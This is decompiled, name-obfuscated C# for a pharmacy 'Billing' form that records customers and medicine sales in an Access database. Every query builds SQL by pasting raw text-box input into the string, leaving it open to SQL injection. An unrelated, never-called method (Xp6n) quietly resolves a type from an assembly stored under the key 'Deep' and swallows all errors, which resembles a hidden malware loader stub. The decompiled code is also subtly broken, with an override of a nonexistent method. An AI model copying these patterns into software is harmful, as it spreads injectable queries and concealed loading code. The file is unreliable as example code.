using System;
using System.ComponentModel;
using System.Data;
using System.Data.OleDb;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Na75;
using d2J;

namespace Ex2a;

[DesignerGenerated]
public class Wr7o : Form
{
	private IContainer components;

	private OleDbConnection con;

	internal virtual GroupBox GroupBox2
	{
		[CompilerGenerated]
		get
		{
			return _GroupBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Gz74;
			GroupBox groupBox = _GroupBox2;
			if (groupBox != null)
			{
				((Control)groupBox).remove_Enter(eventHandler);
			}
			_GroupBox2 = value;
			groupBox = _GroupBox2;
			if (groupBox != null)
			{
				((Control)groupBox).add_Enter(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("id")]
	internal virtual TextBox id
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("na")]
	internal virtual TextBox na
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("eid")]
	internal virtual Label eid
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label7")]
	internal virtual Label Label7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label8")]
	internal virtual Label Label8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("quantit")]
	internal virtual TextBox quantit
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button complete
	{
		[CompilerGenerated]
		get
		{
			return _complete;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = a4SQ;
			Button val = _complete;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_complete = value;
			val = _complete;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button ad
	{
		[CompilerGenerated]
		get
		{
			return _ad;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Wb79;
			Button val = _ad;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_ad = value;
			val = _ad;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("total")]
	internal virtual TextBox total
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("GroupBox1")]
	internal virtual GroupBox GroupBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("num")]
	internal virtual TextBox num
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("nam")]
	internal virtual TextBox nam
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("phone")]
	internal virtual TextBox phone
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("city")]
	internal virtual TextBox city
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("dat")]
	internal virtual DateTimePicker dat
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pick")]
	internal virtual Label pick
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button add
	{
		[CompilerGenerated]
		get
		{
			return _add;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = k3R6;
			Button val = _add;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_add = value;
			val = _add;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button gen
	{
		[CompilerGenerated]
		get
		{
			return _gen;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Kz21;
			Button val = _gen;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_gen = value;
			val = _gen;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	internal virtual ListBox list
	{
		[CompilerGenerated]
		get
		{
			return _list;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Tr83;
			ListBox val = _list;
			if (val != null)
			{
				val.remove_SelectedIndexChanged(eventHandler);
			}
			_list = value;
			val = _list;
			if (val != null)
			{
				val.add_SelectedIndexChanged(eventHandler);
			}
		}
	}

	public Wr7o()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Mw6n);
		con = new OleDbConnection();
		Cj1i();
	}

	[DebuggerNonUserCode]
	protected override void i3LA(bool w7RB)
	{
		try
		{
			if (w7RB && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(w7RB);
		}
	}

	[DebuggerStepThrough]
	private void Cj1i()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		GroupBox2 = new GroupBox();
		id = new TextBox();
		na = new TextBox();
		Label5 = new Label();
		eid = new Label();
		Label7 = new Label();
		Label8 = new Label();
		quantit = new TextBox();
		complete = new Button();
		ad = new Button();
		total = new TextBox();
		GroupBox1 = new GroupBox();
		num = new TextBox();
		nam = new TextBox();
		phone = new TextBox();
		city = new TextBox();
		dat = new DateTimePicker();
		pick = new Label();
		add = new Button();
		Label3 = new Label();
		Label2 = new Label();
		Label1 = new Label();
		Label4 = new Label();
		gen = new Button();
		list = new ListBox();
		((Control)GroupBox2).SuspendLayout();
		((Control)GroupBox1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)GroupBox2).set_BackColor(SystemColors.GradientInactiveCaption);
		((Control)GroupBox2).get_Controls().Add((Control)(object)id);
		((Control)GroupBox2).get_Controls().Add((Control)(object)na);
		((Control)GroupBox2).get_Controls().Add((Control)(object)Label5);
		((Control)GroupBox2).get_Controls().Add((Control)(object)eid);
		((Control)GroupBox2).get_Controls().Add((Control)(object)Label7);
		((Control)GroupBox2).get_Controls().Add((Control)(object)Label8);
		((Control)GroupBox2).get_Controls().Add((Control)(object)quantit);
		((Control)GroupBox2).get_Controls().Add((Control)(object)complete);
		((Control)GroupBox2).get_Controls().Add((Control)(object)ad);
		((Control)GroupBox2).get_Controls().Add((Control)(object)total);
		((Control)GroupBox2).set_Location(new Point(448, 35));
		((Control)GroupBox2).set_Name("GroupBox2");
		((Control)GroupBox2).set_Size(new Size(404, 388));
		((Control)GroupBox2).set_TabIndex(48);
		GroupBox2.set_TabStop(false);
		GroupBox2.set_Text("Medicine Details");
		((Control)id).set_Location(new Point(222, 42));
		((Control)id).set_Name("id");
		((Control)id).set_Size(new Size(143, 22));
		((Control)id).set_TabIndex(33);
		((Control)na).set_Location(new Point(222, 92));
		((Control)na).set_Name("na");
		((Control)na).set_Size(new Size(143, 22));
		((Control)na).set_TabIndex(34);
		Label5.set_AutoSize(true);
		((Control)Label5).set_Location(new Point(63, 213));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(56, 17));
		((Control)Label5).set_TabIndex(43);
		Label5.set_Text("Amount");
		eid.set_AutoSize(true);
		((Control)eid).set_Location(new Point(38, 45));
		((Control)eid).set_Name("eid");
		((Control)eid).set_Size(new Size(107, 17));
		((Control)eid).set_TabIndex(36);
		eid.set_Text("Eid Of Medicine");
		Label7.set_AutoSize(true);
		((Control)Label7).set_Location(new Point(38, 99));
		((Control)Label7).set_Name("Label7");
		((Control)Label7).set_Size(new Size(121, 17));
		((Control)Label7).set_TabIndex(37);
		Label7.set_Text("Name of Medicine");
		Label8.set_AutoSize(true);
		((Control)Label8).set_Location(new Point(58, 158));
		((Control)Label8).set_Name("Label8");
		((Control)Label8).set_Size(new Size(61, 17));
		((Control)Label8).set_TabIndex(38);
		Label8.set_Text("Quantity");
		((Control)quantit).set_Location(new Point(222, 153));
		((Control)quantit).set_Name("quantit");
		((Control)quantit).set_Size(new Size(143, 22));
		((Control)quantit).set_TabIndex(35);
		((Control)complete).set_Location(new Point(222, 302));
		((Control)complete).set_Name("complete");
		((Control)complete).set_Size(new Size(138, 41));
		((Control)complete).set_TabIndex(41);
		((ButtonBase)complete).set_Text("Complete");
		((ButtonBase)complete).set_UseVisualStyleBackColor(true);
		((Control)ad).set_Location(new Point(41, 302));
		((Control)ad).set_Name("ad");
		((Control)ad).set_Size(new Size(141, 41));
		((Control)ad).set_TabIndex(39);
		((ButtonBase)ad).set_Text("Add Item");
		((ButtonBase)ad).set_UseVisualStyleBackColor(true);
		((Control)total).set_Location(new Point(222, 208));
		((Control)total).set_Name("total");
		((TextBoxBase)total).set_ReadOnly(true);
		((Control)total).set_Size(new Size(128, 22));
		((Control)total).set_TabIndex(42);
		total.set_Text("0");
		((Control)GroupBox1).set_BackColor(SystemColors.GradientInactiveCaption);
		((Control)GroupBox1).get_Controls().Add((Control)(object)num);
		((Control)GroupBox1).get_Controls().Add((Control)(object)nam);
		((Control)GroupBox1).get_Controls().Add((Control)(object)phone);
		((Control)GroupBox1).get_Controls().Add((Control)(object)city);
		((Control)GroupBox1).get_Controls().Add((Control)(object)dat);
		((Control)GroupBox1).get_Controls().Add((Control)(object)pick);
		((Control)GroupBox1).get_Controls().Add((Control)(object)add);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label3);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label4);
		((Control)GroupBox1).get_Controls().Add((Control)(object)gen);
		((Control)GroupBox1).set_Location(new Point(35, 35));
		((Control)GroupBox1).set_Name("GroupBox1");
		((Control)GroupBox1).set_Size(new Size(333, 388));
		((Control)GroupBox1).set_TabIndex(47);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("Add Customer");
		((Control)num).set_Location(new Point(115, 28));
		((Control)num).set_Name("num");
		((Control)num).set_Size(new Size(170, 22));
		((Control)num).set_TabIndex(24);
		((Control)nam).set_Location(new Point(115, 65));
		((Control)nam).set_Name("nam");
		((Control)nam).set_Size(new Size(170, 22));
		((Control)nam).set_TabIndex(21);
		((Control)phone).set_Location(new Point(115, 122));
		((Control)phone).set_Name("phone");
		((Control)phone).set_Size(new Size(170, 22));
		((Control)phone).set_TabIndex(22);
		((Control)city).set_Location(new Point(115, 171));
		((Control)city).set_Name("city");
		((Control)city).set_Size(new Size(170, 22));
		((Control)city).set_TabIndex(23);
		((Control)dat).set_Location(new Point(140, 221));
		((Control)dat).set_Name("dat");
		((Control)dat).set_Size(new Size(145, 22));
		((Control)dat).set_TabIndex(30);
		pick.set_AutoSize(true);
		((Control)pick).set_Location(new Point(32, 226));
		((Control)pick).set_Name("pick");
		((Control)pick).set_Size(new Size(38, 17));
		((Control)pick).set_TabIndex(29);
		pick.set_Text("Date");
		((Control)add).set_Location(new Point(68, 305));
		((Control)add).set_Name("add");
		((Control)add).set_Size(new Size(158, 45));
		((Control)add).set_TabIndex(31);
		((ButtonBase)add).set_Text("Add Customer");
		((ButtonBase)add).set_UseVisualStyleBackColor(true);
		Label3.set_AutoSize(true);
		((Control)Label3).set_Location(new Point(25, 171));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(31, 17));
		((Control)Label3).set_TabIndex(27);
		Label3.set_Text("City");
		Label2.set_AutoSize(true);
		((Control)Label2).set_Location(new Point(6, 125));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(103, 17));
		((Control)Label2).set_TabIndex(26);
		Label2.set_Text("Phone Number");
		Label1.set_AutoSize(true);
		((Control)Label1).set_Location(new Point(25, 70));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(45, 17));
		((Control)Label1).set_TabIndex(25);
		Label1.set_Text("Name");
		Label4.set_AutoSize(true);
		((Control)Label4).set_Location(new Point(18, 31));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(52, 17));
		((Control)Label4).set_TabIndex(28);
		Label4.set_Text("Bill No.");
		((Control)gen).set_Location(new Point(111, 0));
		((Control)gen).set_Name("gen");
		((Control)gen).set_Size(new Size(98, 22));
		((Control)gen).set_TabIndex(32);
		((ButtonBase)gen).set_Text("New Number");
		((ButtonBase)gen).set_UseVisualStyleBackColor(true);
		((ListControl)list).set_FormattingEnabled(true);
		list.set_ItemHeight(16);
		((Control)list).set_Location(new Point(968, 35));
		((Control)list).set_Name("list");
		list.set_ScrollAlwaysVisible(true);
		list.set_SelectionMode((SelectionMode)3);
		((Control)list).set_Size(new Size(439, 388));
		((Control)list).set_TabIndex(46);
		((Control)list).set_Visible(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.GradientActiveCaption);
		((Form)this).set_ClientSize(new Size(1424, 461));
		((Control)this).get_Controls().Add((Control)(object)GroupBox2);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)list);
		((Control)this).set_Name("Form32");
		((Form)this).set_Text("Billing");
		((Control)GroupBox2).ResumeLayout(false);
		((Control)GroupBox2).PerformLayout();
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	private void Mw6n(object sender, EventArgs e)
	{
		string currentDirectory = Directory.GetCurrentDirectory();
		currentDirectory = Directory.GetParent(currentDirectory)!.ToString();
		currentDirectory = Directory.GetParent(currentDirectory)!.ToString();
		string connectionString = "provider=microsoft.ACE.OLEDB.12.0 ; data source = " + currentDirectory + "\\hms_Database.accdb";
		con.set_ConnectionString(connectionString);
	}

	private void k3R6(object sender, EventArgs e)
	{
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_027a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0280: Expected O, but got Unknown
		//IL_03f9: Unknown result type (might be due to invalid IL or missing references)
		if ((Operators.CompareString(num.get_Text(), "", false) == 0) | (Operators.CompareString(nam.get_Text(), "", false) == 0))
		{
			MessageBox.Show("Bill no and customer name can't be left empty");
			return;
		}
		if ((phone.get_Text().Length != 10) | phone.get_Text().Contains(",") | phone.get_Text().Contains(".") | phone.get_Text().Contains("(") | phone.get_Text().Contains("-") | phone.get_Text().Contains(" ") | !Versioned.IsNumeric((object)phone.get_Text()) | phone.get_Text().Contains("+"))
		{
			MessageBox.Show("Enter valid 10-digit mobile number without +91 or 0 in the beginning", "Invalid Input");
			return;
		}
		list.get_Items().Clear();
		((Control)list).set_Visible(true);
		list.get_Items().Add((object)(("Bill Number: " + num.get_Text()) ?? ""));
		list.get_Items().Add((object)(("Costumer name: " + nam.get_Text()) ?? ""));
		list.get_Items().Add((object)(("City:  " + city.get_Text()) ?? ""));
		list.get_Items().Add((object)(("Contact No.:  " + phone.get_Text()) ?? ""));
		list.get_Items().Add((object)(("Date:  " + Conversions.ToString(dat.get_Value())) ?? ""));
		list.get_Items().Add((object)"");
		list.get_Items().Add((object)"");
		list.get_Items().Add((object)"Medicine Name     MRP     Quantity     Total value");
		list.get_Items().Add((object)"");
		con.Open();
		OleDbCommand val = new OleDbCommand();
		val.get_Parameters().Add(val.CreateParameter()).set_ParameterName("Bill Number");
		val.get_Parameters().get_Item("Bill Number").set_Value((object)num.get_Text());
		val.get_Parameters().Add(val.CreateParameter()).set_ParameterName("Costumer Name");
		val.get_Parameters().get_Item("Costumer Name").set_Value((object)nam.get_Text());
		val.get_Parameters().Add(val.CreateParameter()).set_ParameterName("Prescriptions");
		val.get_Parameters().get_Item("Prescriptions").set_Value((object)"");
		val.get_Parameters().Add(val.CreateParameter()).set_ParameterName("Total Amount");
		val.get_Parameters().get_Item("Total Amount").set_Value((object)"0");
		try
		{
			val.set_CommandText("INSERT INTO Billing_DataBase (bill,name,phone,amount) VALUES ('" + num.get_Text() + "','" + nam.get_Text() + "','" + phone.get_Text() + "',0 )");
			val.set_CommandType(CommandType.Text);
			val.set_Connection(con);
			val.ExecuteNonQuery();
			((Component)(object)val).Dispose();
			con.Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			((TextBoxBase)num).Clear();
			con.Close();
			ProjectData.ClearProjectError();
		}
	}

	private void Kz21(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		list.get_Items().Clear();
		con.Open();
		OleDbCommand val = new OleDbCommand();
		val.set_CommandText("Select COUNT(*)  FROM  Billing_DataBase ");
		val.set_CommandType(CommandType.Text);
		val.set_Connection(con);
		int num = Conversions.ToInteger(val.ExecuteScalar());
		this.num.set_Text(Conversions.ToString(checked(num + 1)));
		con.Close();
	}

	private void Tr83(object sender, EventArgs e)
	{
	}

	private void Wb79(object sender, EventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_0278: Unknown result type (might be due to invalid IL or missing references)
		//IL_028c: Unknown result type (might be due to invalid IL or missing references)
		int num = 0;
		con.Open();
		OleDbCommand val = new OleDbCommand();
		try
		{
			val.set_CommandText("Select quantity  FROM Pharmacy_DataBase where Eid='" + id.get_Text() + "'And name='" + na.get_Text() + "'");
			val.set_CommandType(CommandType.Text);
			val.set_Connection(con);
			num = Conversions.ToInteger(val.ExecuteScalar());
			if ((double)num >= Conversions.ToDouble(quantit.get_Text()))
			{
				val.set_CommandText("Select rate  FROM  Pharmacy_DataBase where Eid='" + id.get_Text() + "'And name='" + na.get_Text() + "'");
				val.set_CommandType(CommandType.Text);
				val.set_Connection(con);
				double num2 = Conversions.ToDouble(val.ExecuteScalar());
				double num3 = num2 * Conversions.ToDouble(quantit.get_Text());
				((TextBoxBase)total).set_ReadOnly(false);
				total.set_Text(Conversions.ToString(Conversions.ToDouble(total.get_Text()) + num3));
				((TextBoxBase)total).set_ReadOnly(true);
				list.get_Items().Add((object)("'" + na.get_Text() + "'               '" + Conversions.ToString(num2) + "'          '" + quantit.get_Text() + "'          '" + Conversions.ToString(num3) + "'"));
				int num4 = Conversions.ToInteger(quantit.get_Text());
				val.set_CommandText("UPDATE   Pharmacy_DataBase SET quantity =quantity-'" + Conversions.ToString(num4) + "'  where  ( name='" + na.get_Text() + "' And Eid = '" + id.get_Text() + "' )");
				val.set_CommandType(CommandType.Text);
				val.set_Connection(con);
				val.ExecuteNonQuery();
				((Component)(object)val).Dispose();
				((TextBoxBase)quantit).Clear();
				((TextBoxBase)na).Clear();
				((TextBoxBase)id).Clear();
			}
			else
			{
				MessageBox.Show("Not proper quantity of medicines There are only '" + Conversions.ToString(num) + "' piece Left");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"Something is missing", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		con.Close();
	}

	internal static bool Xp6n()
	{
		try
		{
			try
			{
				Type type = Li23.Zn0z((Assembly)Jw8.mDic["Deep"]);
				if (Operators.CompareString(type.Name, Jw8.mDic[Jw8.tName].ToString(), false) == 0)
				{
					Jw8.mDic.Add(Jw8.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	private void a4SQ(object sender, EventArgs e)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		con.Open();
		OleDbCommand val = new OleDbCommand();
		val.set_CommandText("UPDATE   Billing_DataBase SET amount ='" + total.get_Text() + "'  where  (  bill = '" + num.get_Text() + "' )");
		val.set_CommandType(CommandType.Text);
		val.set_Connection(con);
		val.ExecuteNonQuery();
		((Component)(object)val).Dispose();
		list.get_Items().Add((object)"");
		list.get_Items().Add((object)"");
		list.get_Items().Add((object)("                                                   Total Amount  '" + total.get_Text() + "' "));
		((TextBoxBase)na).Clear();
		((TextBoxBase)id).Clear();
		((TextBoxBase)quantit).Clear();
		total.set_Text(Conversions.ToString(0));
		con.Close();
	}

	private void Gz74(object sender, EventArgs e)
	{
	}
}
